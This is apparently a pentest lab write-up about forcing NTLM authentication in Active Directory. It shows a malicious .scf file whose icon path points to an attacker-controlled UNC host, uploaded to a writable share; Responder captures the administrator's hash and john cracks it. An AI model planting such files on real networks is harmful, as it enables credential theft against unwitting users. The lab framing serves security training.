---
title: Force Authentication
date: 2022-06-03 05:49:33 +0800
categories: [Infrastructure Pentesting, Active Directory]
tags: []  
---

# Force Authentication

# Exploitation

In this lab, we will use this credential `saifullah:sPassword@123` to enumerate our target machine.

Let's start by enumerating shares.

![relay](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/smbrelay1.png)

Here we have `Read, Write` permission on `devops` share. Which means we can upload a file to the share.

We will create a malicious file that will force the target machine to try to authenticate with our machine, which will allow us to obtain ntlm hash of the user.

```batch

[Shell]
Command=2
IconFile=\\10.42.0.1\\share\noexist.txt
[Taskbar]
Command=ToggleDesktop

```
Now we will save it in .scf file and then upload it to the `devops` share.

![relay](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/smbrelay2.png)

We will run `responder` and wait for someone to access the `devops` share.

![relay](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/smbrelay3.png)

We can retrieve the ntlm hash of anyone who accesses the devops share. 

Let's login to the victim machine and access the share.

![relay](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/smbrelay4.png)

Let's go back to our machine and check it.

![relay](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/smbrelay6.png)

As you can see we have got ntlm hash of the administrator. We will save it and crack it using `john`.

![relay](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/smbrelay7.png)

We were able to recover the ntlm hash.

# References

